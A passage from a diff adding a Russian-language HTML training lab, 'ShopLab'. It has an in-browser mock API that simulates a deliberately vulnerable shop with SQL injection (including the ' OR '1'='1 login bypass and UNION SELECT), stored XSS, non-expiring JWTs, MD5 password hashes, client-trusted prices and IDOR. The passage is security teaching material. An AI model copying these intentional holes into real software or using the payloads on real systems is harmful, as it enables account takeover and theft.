@@ -1,0 +1,2235 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ShopLab — Интерактивная Кибер-Лаборатория</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --surface2: #21262d;
+    --surface3: #30363d;
+    --border: #30363d;
+    --text: #e6edf3;
+    --text2: #8b949e;
+    --text3: #6e7681;
+    --green: #3fb950;
+    --green-bg: #0d1f0f;
+    --red: #f85149;
+    --red-bg: #2d0a0a;
+    --yellow: #e3b341;
+    --yellow-bg: #2d1f00;
+    --blue: #58a6ff;
+    --blue-bg: #0c1929;
+    --purple: #bc8cff;
+    --purple-bg: #1a0e2e;
+    --orange: #f0883e;
+    --orange-bg: #2d1500;
+    --accent: #238636;
+    --accent-hover: #2ea043;
+    --font-mono: 'Courier New', Courier, monospace;
+    --font-main: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    --radius: 8px;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: var(--font-main);
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    line-height: 1.6;
+  }
+
+  .header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 16px 24px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  .logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 18px;
+    font-weight: 700;
+    color: var(--text);
+  }
+
+  .logo-icon {
+    width: 32px;
+    height: 32px;
+    background: linear-gradient(135deg, #ff6b35, #f53);
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+  }
+
+  .header-right {
+    margin-left: auto;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .status-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: var(--red);
+    animation: pulse 2s infinite;
+  }
+
+  .status-dot.connected {
+    background: var(--green);
+    animation: none;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  .status-text {
+    font-size: 13px;
+    color: var(--text2);
+  }
+
+  .layout {
+    display: grid;
+    grid-template-columns: 280px 1fr 340px;
+    height: calc(100vh - 65px);
+  }
+
+  /* LEFT SIDEBAR */
+  .sidebar {
+    background: var(--surface);
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+    padding: 16px 0;
+  }
+
+  .sidebar-section {
+    padding: 0 16px;
+    margin-bottom: 8px;
+  }
+
+  .sidebar-label {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--text3);
+    padding: 8px 0 6px;
+  }
+
+  .vuln-item {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px 12px;
+    border-radius: var(--radius);
+    cursor: pointer;
+    transition: all 0.15s;
+    border: 1px solid transparent;
+    margin-bottom: 4px;
+  }
+
+  .vuln-item:hover {
+    background: var(--surface2);
+    border-color: var(--border);
+  }
+
+  .vuln-item.active {
+    background: var(--surface2);
+    border-color: var(--blue);
+  }
+
+  .vuln-item.done {
+    opacity: 0.7;
+  }
+
+  .vuln-item.done .vuln-name {
+    text-decoration: line-through;
+    color: var(--text3);
+  }
+
+  .vuln-badge {
+    font-size: 10px;
+    font-weight: 700;
+    padding: 2px 6px;
+    border-radius: 4px;
+    min-width: 28px;
+    text-align: center;
+    flex-shrink: 0;
+  }
+
+  .badge-critical { background: #4d0000; color: #ff6b6b; border: 1px solid #8b0000; }
+  .badge-high { background: #2d1500; color: #f0883e; border: 1px solid #6b3400; }
+  .badge-medium { background: #2d2200; color: #e3b341; border: 1px solid #6b5000; }
+  .badge-low { background: #0d1f0f; color: #3fb950; border: 1px solid #1a4d1a; }
+
+  .vuln-name {
+    font-size: 13px;
+    color: var(--text);
+    line-height: 1.3;
+  }
+
+  .check-icon {
+    margin-left: auto;
+    color: var(--green);
+    font-size: 16px;
+    display: none;
+  }
+
+  .vuln-item.done .check-icon { display: block; }
+
+  .progress-bar-wrap {
+    padding: 12px 16px;
+    border-top: 1px solid var(--border);
+    margin-top: 8px;
+  }
+
+  .progress-label {
+    font-size: 12px;
+    color: var(--text2);
+    margin-bottom: 8px;
+    display: flex;
+    justify-content: space-between;
+  }
+
+  .progress-bar {
+    height: 6px;
+    background: var(--surface3);
+    border-radius: 3px;
+    overflow: hidden;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: var(--green);
+    border-radius: 3px;
+    transition: width 0.4s ease;
+    width: 0%;
+  }
+
+  /* MAIN AREA */
+  .main {
+    overflow-y: auto;
+    padding: 0;
+  }
+
+  .vuln-header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 20px 28px;
+  }
+
+  .vuln-title-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 8px;
+  }
+
+  .vuln-title {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+  }
+
+  .vuln-desc {
+    font-size: 14px;
+    color: var(--text2);
+    max-width: 700px;
+    line-height: 1.6;
+  }
+
+  .danger-box {
+    margin: 0 28px 0;
+    padding: 14px 18px;
+    background: var(--red-bg);
+    border: 1px solid #5a1010;
+    border-radius: var(--radius);
+    font-size: 13px;
+    color: #ffaaaa;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+  }
+
+  .danger-box.info {
+    background: var(--blue-bg);
+    border-color: #1a3d6b;
+    color: #aaccff;
+  }
+
+  .steps-container {
+    padding: 24px 28px;
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+  }
+
+  .step-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .step-card.active {
+    border-color: var(--blue);
+  }
+
+  .step-card.completed {
+    border-color: var(--green);
+    opacity: 0.85;
+  }
+
+  .step-header {
+    padding: 14px 18px;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .step-num {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background: var(--surface3);
+    border: 2px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 13px;
+    font-weight: 700;
+    flex-shrink: 0;
+    color: var(--text2);
+  }
+
+  .step-card.active .step-num {
+    background: var(--blue-bg);
+    border-color: var(--blue);
+    color: var(--blue);
+  }
+
+  .step-card.completed .step-num {
+    background: var(--green-bg);
+    border-color: var(--green);
+    color: var(--green);
+  }
+
+  .step-title {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text);
+  }
+
+  .step-subtitle {
+    font-size: 12px;
+    color: var(--text2);
+    margin-top: 1px;
+  }
+
+  .step-body {
+    padding: 18px;
+  }
+
+  .step-explain {
+    font-size: 14px;
+    color: var(--text2);
+    margin-bottom: 14px;
+    line-height: 1.7;
+  }
+
+  .code-block {
+    background: #010409;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 14px 16px;
+    font-family: var(--font-mono);
+    font-size: 13px;
+    color: #e6edf3;
+    overflow-x: auto;
+    white-space: pre;
+    margin-bottom: 14px;
+    position: relative;
+  }
+
+  .code-comment { color: #6e7681; }
+  .code-string { color: #a5d6ff; }
+  .code-keyword { color: #ff7b72; }
+  .code-value { color: #79c0ff; }
+  .code-url { color: #ffa657; }
+
+  .copy-btn {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--text2);
+    font-size: 11px;
+    padding: 3px 8px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .copy-btn:hover {
+    background: var(--surface3);
+    color: var(--text);
+  }
+
+  .copy-btn.copied {
+    color: var(--green);
+    border-color: var(--green);
+  }
+
+  .action-row {
+    display: flex;
+    gap: 10px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+
+  .btn {
+    padding: 9px 18px;
+    border-radius: 6px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    border: 1px solid transparent;
+    transition: all 0.15s;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    text-decoration: none;
+  }
+
+  .btn:disabled {
+    opacity: 0.4;
+    cursor: not-allowed;
+  }
+
+  .btn-primary {
+    background: var(--accent);
+    color: #fff;
+    border-color: var(--accent-hover);
+  }
+
+  .btn-primary:hover:not(:disabled) {
+    background: var(--accent-hover);
+  }
+
+  .btn-secondary {
+    background: transparent;
+    color: var(--text);
+    border-color: var(--border);
+  }
+
+  .btn-secondary:hover:not(:disabled) {
+    background: var(--surface2);
+  }
+
+  .btn-danger {
+    background: transparent;
+    color: var(--red);
+    border-color: #5a1010;
+  }
+
+  .btn-danger:hover:not(:disabled) {
+    background: var(--red-bg);
+  }
+
+  .btn-blue {
+    background: #1f4b8e;
+    color: #a8d1ff;
+    border-color: #2d6ab3;
+  }
+
+  .btn-blue:hover:not(:disabled) {
+    background: #2458a5;
+  }
+
+  .input-field {
+    background: #010409;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 9px 14px;
+    font-family: var(--font-mono);
+    font-size: 13px;
+    color: var(--text);
+    width: 100%;
+    outline: none;
+    transition: border-color 0.15s;
+    margin-bottom: 10px;
+  }
+
+  .input-field:focus {
+    border-color: var(--blue);
+  }
+
+  .field-label {
+    font-size: 12px;
+    color: var(--text2);
+    margin-bottom: 5px;
+    display: block;
+  }
+
+  .result-box {
+    background: #010409;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 14px;
+    font-family: var(--font-mono);
+    font-size: 12px;
+    color: var(--text);
+    min-height: 80px;
+    max-height: 250px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    display: none;
+    margin-top: 12px;
+  }
+
+  .result-box.show { display: block; }
+  .result-success { color: var(--green); }
+  .result-error { color: var(--red); }
+  .result-warn { color: var(--yellow); }
+  .result-info { color: var(--blue); }
+
+  .success-banner {
+    display: none;
+    padding: 12px 16px;
+    background: var(--green-bg);
+    border: 1px solid #1a4d1a;
+    border-radius: 6px;
+    color: var(--green);
+    font-size: 14px;
+    font-weight: 600;
+    margin-top: 12px;
+    gap: 8px;
+    align-items: center;
+  }
+
+  .success-banner.show { display: flex; }
+
+  .mark-done-btn {
+    margin-top: 16px;
+    display: none;
+  }
+
+  .mark-done-btn.show { display: block; }
+
+  /* RIGHT PANEL - LOG */
+  .log-panel {
+    background: #010409;
+    border-left: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+  }
+
+  .log-header {
+    padding: 14px 16px;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .log-title {
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--text2);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  .log-clear {
+    font-size: 12px;
+    color: var(--text3);
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 2px 8px;
+    border-radius: 4px;
+    transition: all 0.15s;
+  }
+
+  .log-clear:hover {
+    color: var(--text2);
+    background: var(--surface2);
+  }
+
+  .log-body {
+    flex: 1;
+    overflow-y: auto;
+    padding: 10px;
+    font-family: var(--font-mono);
+    font-size: 12px;
+    line-height: 1.7;
+  }
+
+  .log-entry {
+    display: flex;
+    gap: 8px;
+    padding: 4px 6px;
+    border-radius: 4px;
+    margin-bottom: 2px;
+    animation: fadeIn 0.2s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(3px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .log-entry:hover { background: rgba(255,255,255,0.04); }
+
+  .log-time { color: var(--text3); flex-shrink: 0; font-size: 11px; }
+  .log-level { flex-shrink: 0; font-weight: 700; font-size: 11px; min-width: 42px; }
+  .log-msg { color: var(--text); word-break: break-all; }
+
+  .log-INFO .log-level { color: var(--blue); }
+  .log-SUCCESS .log-level { color: var(--green); }
+  .log-WARN .log-level { color: var(--yellow); }
+  .log-ERROR .log-level { color: var(--red); }
+  .log-HACK .log-level { color: var(--purple); }
+  .log-HACK .log-msg { color: var(--purple); }
+
+  .log-stats {
+    padding: 10px 14px;
+    background: var(--surface);
+    border-top: 1px solid var(--border);
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px;
+  }
+
+  .stat-item {
+    text-align: center;
+  }
+
+  .stat-num {
+    font-size: 20px;
+    font-weight: 700;
+    display: block;
+  }
+
+  .stat-lbl {
+    font-size: 11px;
+    color: var(--text3);
+  }
+
+  .server-hint {
+    padding: 16px 28px 0;
+  }
+
+  .server-box {
+    background: var(--yellow-bg);
+    border: 1px solid #6b5000;
+    border-radius: var(--radius);
+    padding: 12px 16px;
+    font-size: 13px;
+    color: var(--yellow);
+    display: flex;
+    gap: 10px;
+  }
+
+  .tag-row {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    margin-top: 10px;
+  }
+
+  .tag {
+    font-size: 12px;
+    padding: 3px 10px;
+    border-radius: 20px;
+    background: var(--surface3);
+    color: var(--text2);
+    border: 1px solid var(--border);
+  }
+
+  .shimmer {
+    display: inline-block;
+    animation: shimmer 1.5s infinite;
+  }
+
+  @keyframes shimmer {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--surface3); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--text3); }
+
+  .welcome-screen {
+    padding: 60px 28px;
+    text-align: center;
+  }
+
+  .welcome-icon {
+    font-size: 48px;
+    margin-bottom: 20px;
+  }
+
+  .welcome-title {
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 12px;
+    color: var(--text);
+  }
+
+  .welcome-desc {
+    font-size: 15px;
+    color: var(--text2);
+    max-width: 500px;
+    margin: 0 auto 24px;
+    line-height: 1.7;
+  }
+
+  .welcome-cards {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 12px;
+    max-width: 500px;
+    margin: 0 auto;
+  }
+
+  .welcome-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 16px;
+    text-align: left;
+  }
+
+  .wc-icon { font-size: 20px; margin-bottom: 8px; }
+  .wc-title { font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 4px; }
+  .wc-desc { font-size: 12px; color: var(--text2); line-height: 1.5; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">
+    <div class="logo-icon">🔓</div>
+    ShopLab — Кибер-Лаборатория
+  </div>
+  <div class="header-right">
+    <div class="status-dot" id="statusDot"></div>
+    <span class="status-text" id="statusText">Проверяем соединение...</span>
+    <button class="btn btn-secondary" style="padding:6px 14px; font-size:13px;" onclick="checkConnection()">↻ Проверить</button>
+  </div>
+</div>
+
+<div class="layout">
+  <!-- LEFT SIDEBAR -->
+  <div class="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-label">🎯 Уязвимости</div>
+      
+      <div class="vuln-item active" id="nav-0" onclick="showWelcome()">
+        <span style="font-size:18px;">🏠</span>
+        <div>
+          <div class="vuln-name">Главная страница</div>
+          <div style="font-size:11px; color:var(--text3);">Подготовка к работе</div>
+        </div>
+      </div>
+
+      <div class="vuln-item" id="nav-1" onclick="showVuln(1)">
+        <span class="vuln-badge badge-critical">CRIT</span>
+        <div>
+          <div class="vuln-name">VULN-1: SQL Injection</div>
+          <div style="font-size:11px; color:var(--text3);">Вытащить пароли из БД</div>
+        </div>
+        <span class="check-icon">✓</span>
+      </div>
+
+      <div class="vuln-item" id="nav-2" onclick="showVuln(2)">
+        <span class="vuln-badge badge-high">HIGH</span>
+        <div>
+          <div class="vuln-name">VULN-2: Stored XSS</div>
+          <div style="font-size:11px; color:var(--text3);">JS в отзывах</div>
+        </div>
+        <span class="check-icon">✓</span>
+      </div>
+
+      <div class="vuln-item" id="nav-3" onclick="showVuln(3)">
+        <span class="vuln-badge badge-medium">MED</span>
+        <div>
+          <div class="vuln-name">VULN-3: Вечный JWT</div>
+          <div style="font-size:11px; color:var(--text3);">Токен без срока</div>
+        </div>
+        <span class="check-icon">✓</span>
+      </div>
+
+      <div class="vuln-item" id="nav-4" onclick="showVuln(4)">
+        <span class="vuln-badge badge-high">HIGH</span>
+        <div>
+          <div class="vuln-name">VULN-4: Взлом MD5</div>
+          <div style="font-size:11px; color:var(--text3);">Хеши в открытом виде</div>
+        </div>
+        <span class="check-icon">✓</span>
+      </div>
+
+      <div class="vuln-item" id="nav-5" onclick="showVuln(5)">
+        <span class="vuln-badge badge-critical">CRIT</span>
+        <div>
+          <div class="vuln-name">VULN-5: Подделка JWT</div>
+          <div style="font-size:11px; color:var(--text3);">Войти как admin</div>
+        </div>
+        <span class="check-icon">✓</span>
+      </div>
+
+      <div class="vuln-item" id="nav-6" onclick="showVuln(6)">
+        <span class="vuln-badge badge-high">HIGH</span>
+        <div>
+          <div class="vuln-name">VULN-6: Подделка цены</div>
+          <div style="font-size:11px; color:var(--text3);">Купить за 1 копейку</div>
+        </div>
+        <span class="check-icon">✓</span>
+      </div>
+
+      <div class="vuln-item" id="nav-7" onclick="showVuln(7)">
+        <span class="vuln-badge badge-critical">CRIT</span>
+        <div>
+          <div class="vuln-name">VULN-7: IDOR</div>
+          <div style="font-size:11px; color:var(--text3);">Чужие данные и деньги</div>
+        </div>
+        <span class="check-icon">✓</span>
+      </div>
+    </div>
+
+    <div class="progress-bar-wrap">
+      <div class="progress-label">
+        <span>Прогресс</span>
+        <span id="progressCount">0 / 7</span>
+      </div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <div class="main" id="mainContent">
+    <!-- Welcome screen shown by default -->
+  </div>
+
+  <!-- LOG PANEL -->
+  <div class="log-panel">
+    <div class="log-header">
+      <span class="log-title">📋 Лог активности</span>
+      <button class="log-clear" onclick="clearLog()">очистить</button>
+    </div>
+    <div class="log-body" id="logBody">
+      <div style="color: var(--text3); font-size:12px; text-align:center; margin-top:20px;">
+        Здесь будут появляться<br>результаты ваших действий
+      </div>
+    </div>
+    <div class="log-stats">
+      <div class="stat-item">
+        <span class="stat-num" id="statRequests" style="color:var(--blue)">0</span>
+        <span class="stat-lbl">Запросов</span>
+      </div>
+      <div class="stat-item">
+        <span class="stat-num" id="statExploits" style="color:var(--red)">0</span>
+        <span class="stat-lbl">Эксплойтов</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const BASE = 'http://localhost:5000';
+let doneSet = new Set();
+let statReq = 0;
+let statExp = 0;
+let currentToken = null;
+let logFirstEntry = true;
+let mockMode = window.location.protocol === 'file:'; // Сразу включаем для file://, иначе ждём checkConnection
+
+// ═══════════════════════════════════════════════════════════
+// MOCK API — автономная симуляция уязвимого ShopLab API
+// Активируется автоматически если localhost:5000 недоступен
+// ═══════════════════════════════════════════════════════════
+const MOCK = (() => {
+  const md5map = {
+    'admin123':'0192023a7bbd73250516f069df18b500',
+    'alice123':'4b68c1fd2bfb035258d0f865b9150cb0',
+    'bob123':  '0d2b0cf9bea8e0bd8e193b57a09b5b89'
+  };
+  function md5hex(s) { for(const [k,v] of Object.entries(md5map)) if(k===s) return v; return '0'.repeat(32); }
+
+  const state = {
+    users: [
+      {id:1, username:'admin', password: md5hex('admin123'), email:'admin@shoplab.local', role:'admin', balance:9999},
+      {id:2, username:'alice', password: md5hex('alice123'), email:'alice@example.com',   role:'user',  balance:1000},
+      {id:3, username:'bob',   password: md5hex('bob123'),   email:'bob@example.com',    role:'user',  balance:500}
+    ],
+    products: [
+      {id:1, name:'Ноутбук Pro X',     description:'Мощный ноутбук для работы и игр',    price:49999, stock:10, imageUrl:''},
+      {id:2, name:'Смартфон Alpha',    description:'Флагманский смартфон 2024',           price:29999, stock:25, imageUrl:''},
+      {id:3, name:'Наушники SoundMax', description:'Беспроводные наушники с ANC',         price:4999,  stock:50, imageUrl:''},
+      {id:4, name:'Планшет Tab 10',    description:'10-дюймовый планшет для учёбы',       price:15999, stock:15, imageUrl:''},
+      {id:5, name:'Мышь GamerX',       description:'Игровая мышь с RGB подсветкой',       price:2499,  stock:100,imageUrl:''}
+    ],
+    orders: [
+      {id:1, userId:2, productId:1, quantity:1, totalPrice:49999, status:'completed'},
+      {id:2, userId:1, productId:3, quantity:2, totalPrice:9998, status:'completed'}
+    ],
+    reviews: [],
+    orderIdCounter: 3
+  };
+
+  function makeToken(user) {
+    // Намеренно без exp — симуляция уязвимости VULN-3
+    const header = btoa(JSON.stringify({alg:'HS256',typ:'JWT'}));
+    const payload = btoa(JSON.stringify({userId:String(user.id), username:user.username, 'http://schemas.microsoft.com/ws/2008/06/identity/claims/role':user.role}));
+    const sig = btoa('mock-signature-shoplab').replace(/=+$/,'');
+    return header + '.' + payload + '.' + sig;
+  }
+  function decodeToken(token) {
+    try { return JSON.parse(atob(token.split('.')[1])); } catch{ return null; }
+  }
+  function userFromToken(token) {
+    if (!token) return null;
+    const p = decodeToken(token);
+    if (!p) return null;
+    return state.users.find(u => u.id === parseInt(p.userId)) || null;
+  }
+  function ok(data) { return {ok:true, status:200, json:async()=>data, text:async()=>JSON.stringify(data)}; }
+  function err(status, msg) { const d={error:msg}; return {ok:false, status, json:async()=>d, text:async()=>JSON.stringify(d)}; }
+
+  async function handle(method, path, body, token) {
+    await new Promise(r => setTimeout(r, 80 + Math.random()*120)); // имитация задержки сети
+
+    // POST /api/auth/register
+    if (method==='POST' && path==='/api/auth/register') {
+      const {username,password,email}=body;
+      if (!username||!password) return err(400,'Username и Password обязательны');
+      if (state.users.find(u=>u.username===username)) return err(409,'Пользователь уже существует');
+      const newUser = {id:state.users.length+1, username, password:md5hex(password)||('md5_'+password), email:email||'', role:'user', balance:1000};
+      state.users.push(newUser);
+      return ok({token:makeToken(newUser), user:{id:newUser.id,username:newUser.username,email:newUser.email,role:newUser.role,balance:newUser.balance}});
+    }
+
+    // POST /api/auth/login  [VULN-1: SQL injection симуляция]
+    if (method==='POST' && path==='/api/auth/login') {
+      const {username,password}=body;
+      // VULN-1 симуляция: если username содержит ' OR '1'='1 — отдать admin
+      if (username && username.includes("' OR '1'='1")) {
+        const admin = state.users[0];
+        return ok({token:makeToken(admin), user:{id:admin.id,username:admin.username,email:admin.email,role:admin.role,balance:admin.balance}});
+      }
+      const user = state.users.find(u=>u.username===username && u.password===md5hex(password));
+      if (!user) return err(401,'Неверный логин или пароль');
+      return ok({token:makeToken(user), user:{id:user.id,username:user.username,email:user.email,role:user.role,balance:user.balance}});
+    }
+
+    // GET /api/auth/me [VULN-4: возвращает hash пароля]
+    if (method==='GET' && path==='/api/auth/me') {
+      const u = userFromToken(token);
+      if (!u) return err(401,'Unauthorized');
+      return ok({id:u.id, username:u.username, email:u.email, role:u.role, balance:u.balance, password:u.password}); // VULN-4
+    }
+
+    // GET /api/auth/users
+    if (method==='GET' && path==='/api/auth/users') {
+      const u = userFromToken(token);
+      if (!u || u.role!=='admin') return err(403,'Forbidden');
+      return ok(state.users);
+    }
+
+    // GET /api/products
+    if (method==='GET' && path==='/api/products') return ok(state.products);
+
+    // GET /api/products/search?q=...  [VULN-1: SQL Injection симуляция]
+    if (method==='GET' && path.startsWith('/api/products/search')) {
+      const q = decodeURIComponent(path.split('q=')[1]||'');
+      // VULN-1: симуляция UNION SELECT — если payload содержит UNION SELECT
+      if (q.includes('UNION') && q.includes('FROM Users')) {
+        // Возвращаем пользователей как "продукты"
+        return ok(state.users.map(u=>({id:u.id, name:u.username, description:u.password, price:u.balance, stock:1, imageUrl:''})));
+      }
+      // Простой поиск
+      const filtered = state.products.filter(p=>
+        p.name.toLowerCase().includes(q.toLowerCase()) ||
+        p.description.toLowerCase().includes(q.toLowerCase())
+      );
+      // Если апостроф — симулируем ошибку (признак SQLi)
+      if (q.includes("'")) {
+        return {ok:false, status:500, json:async()=>({error:'SQLite error near \"\'\" : syntax error'}), text:async()=>'{"error":"SQLite error near \\\"\\\'\\\" : syntax error"}'};
+      }
+      return ok(filtered);
+    }
+
+    // GET /api/products/:id/reviews
+    if (method==='GET' && /^\/api\/products\/\d+\/reviews$/.test(path)) {
+      const pid = parseInt(path.split('/')[3]);
+      const reviews = state.reviews.filter(r=>r.productId===pid).map(r=>({
+        ...r, username: state.users.find(u=>u.id===r.userId)?.username||'unknown', authorName: state.users.find(u=>u.id===r.userId)?.username||'unknown'
+      }));
+      return ok(reviews);
+    }
+
+    // POST /api/products/reviews [VULN-2: XSS — content не фильтруется]
+    if (method==='POST' && path==='/api/products/reviews') {
+      const u = userFromToken(token);
+      if (!u) return err(401,'Unauthorized');
+      const {productId, content, rating}=body;
+      state.reviews.push({id:state.reviews.length+1, productId, userId:u.id, content, rating}); // VULN-2
+      return ok({message:'Отзыв добавлен'});
+    }
+
+    // POST /api/orders/purchase [VULN-6: clientPrice, отрицательное qty]
+    if (method==='POST' && path==='/api/orders/purchase') {
+      const u = userFromToken(token);
+      if (!u) return err(401,'Unauthorized');
+      const {productId, quantity, clientPrice}=body;
+      const product = state.products.find(p=>p.id===productId);
+      if (!product) return err(404,'Товар не найден');
+      const price = clientPrice != null ? clientPrice : product.price; // VULN-6
+      const total = price * quantity; // VULN-6: нет проверки qty>0
+      const userIdx = state.users.findIndex(uu=>uu.id===u.id);
+      state.users[userIdx].balance -= total;
+      const order = {id:state.orderIdCounter++, userId:u.id, productId, quantity, totalPrice:total, status:'completed'};
+      state.orders.push(order);
+      return ok({message:'Заказ создан', order:{id:order.id, totalPrice:order.totalPrice, status:order.status}});
+    }
+
+    // GET /api/orders/my
+    if (method==='GET' && path==='/api/orders/my') {
+      const u = userFromToken(token);
+      if (!u) return err(401,'Unauthorized');
+      const orders = state.orders.filter(o=>o.userId===u.id).map(o=>({
+        ...o, productName:state.products.find(p=>p.id===o.productId)?.name||'', username:u.username
+      }));
+      return ok(orders);
+    }
+
+    // GET /api/orders/:id [VULN-7: IDOR]
+    if (method==='GET' && /^\/api\/orders\/\d+$/.test(path)) {
+      const u = userFromToken(token);
+      if (!u) return err(401,'Unauthorized');
+      const oid = parseInt(path.split('/')[3]);
+      const order = state.orders.find(o=>o.id===oid); // VULN-7: нет проверки userId
+      if (!order) return err(404,'Заказ не найден');
+      return ok({...order, productName:state.products.find(p=>p.id===order.productId)?.name||'', username:state.users.find(uu=>uu.id===order.userId)?.username||''});
+    }
+
+    // POST /api/orders/transfer [VULN-7: IDOR]
+    if (method==='POST' && path==='/api/orders/transfer') {
+      const u = userFromToken(token);
+      if (!u) return err(401,'Unauthorized');
+      const {fromUserId, toUserId, amount}=body;
+      if (amount<=0) return err(400,'Сумма должна быть больше нуля');
+      // VULN-7: нет проверки fromUserId === u.id
+      const fi = state.users.findIndex(uu=>uu.id===fromUserId);
+      const ti = state.users.findIndex(uu=>uu.id===toUserId);
+      if (fi<0||ti<0) return err(404,'Пользователь не найден');
+      state.users[fi].balance -= amount;
+      state.users[ti].balance += amount;
+      return ok({message:`Переведено ${amount} ₽ с аккаунта #${fromUserId} на #${toUserId}`});
+    }
+
+    return err(404,'Not found');
+  }
+
+  return {
+    handle,
+    decodeToken,
+    state, // для VULN-5 forge
+    makeToken
+  };
+})();
+
+// Перехватчик fetch — если mockMode, использует MOCK
+const _realFetch = window.fetch.bind(window);
+window._mockFetch = async function(url, opts={}) {
+  const method = (opts.method||'GET').toUpperCase();
+  const urlObj = new URL(url, window.location.href);
+  const path = urlObj.pathname + (urlObj.search||'');
+  const body = opts.body ? JSON.parse(opts.body) : {};
+  const token = (opts.headers?.['Authorization']||'').replace('Bearer ','') || null;
+  return MOCK.handle(method, path, body, token);
+};
+
+// ─── LOGGING ─────────────────────────────────────────────
+function log(level, msg) {
+  if (logFirstEntry) {
+    document.getElementById('logBody').innerHTML = '';
+    logFirstEntry = false;
+  }
+  const now = new Date();
+  const t = now.toTimeString().slice(0,8);
+  const el = document.createElement('div');
+  el.className = `log-entry log-${level}`;
+  el.innerHTML = `<span class="log-time">${t}</span><span class="log-level">[${level}]</span><span class="log-msg">${escHtml(msg)}</span>`;
+  const body = document.getElementById('logBody');
+  body.appendChild(el);
+  body.scrollTop = body.scrollHeight;
+}
+
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function clearLog() {
+  document.getElementById('logBody').innerHTML = '<div style="color:var(--text3);font-size:12px;text-align:center;margin-top:20px;">Лог очищен</div>';
+  logFirstEntry = false;
+}
+
+function incReq() { statReq++; document.getElementById('statRequests').textContent = statReq; }
+function incExp() { statExp++; document.getElementById('statExploits').textContent = statExp; }
+
+// ─── CONNECTION CHECK ─────────────────────────────────────
+async function checkConnection() {
+  // Если открыто через file:// — реальный fetch невозможен, сразу demo mode
+  if (window.location.protocol === 'file:') {
+    mockMode = true;
+    document.getElementById('statusDot').className = 'status-dot connected';
+    document.getElementById('statusText').textContent = '🎭 Демо-режим (Mock API)';
+    log('SUCCESS', '🎭 Файл открыт локально — активирован встроенный Mock API');
+    log('INFO', 'Все 7 уязвимостей симулируются прямо в браузере без сервера.');
+    log('INFO', 'Для реального режима: dotnet run + открыть через http://localhost:5000');
+    return;
+  }
+  // Если открыто через http:// — пробуем реальный сервер
+  log('INFO', 'Проверяем соединение с ShopLab на ' + BASE + '...');
+  try {
